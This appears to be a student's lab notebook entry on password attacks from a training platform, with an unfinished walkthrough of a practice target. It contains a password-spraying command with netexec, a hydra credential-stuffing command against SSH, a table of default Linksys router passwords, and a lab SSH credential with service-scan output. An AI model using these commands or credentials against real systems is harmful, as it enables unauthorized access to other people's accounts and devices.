---
id: password_attack
aliases:
  - password-attack
tags:
  - brute-foce
---

# Spraying, Stuffing, and Defaults
## Spraying: 
`netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'`
## Stuffing 
`hydra -C user_pass.list ssh://10.100.38.23`
## Defaults
`pip3 install defaultcreds-cheat-sheet`
```
creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```
## Lab:
- IP: 10.129.190.20
- SSH credential: sam:B@tm@n2022!
- *Mission*: Retrieve MySQL credential
### Execution:
- [x] Check if the target and mysql service is on
`ip addr show tun0`: check for the connection between vmachine and htb server
`ping <IP>`: check the target's availability
`nmap <target> -sV`: check for services running on target
- [>] Result:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- [x] Connect to ssh using provided credential
`ssh <username>@<target>`: connect to <target>'s ssh server as <username>    
- [>] Nothing was found => use the known credential on ftp service
- [>] Found will and kira username => test those credential on smb 






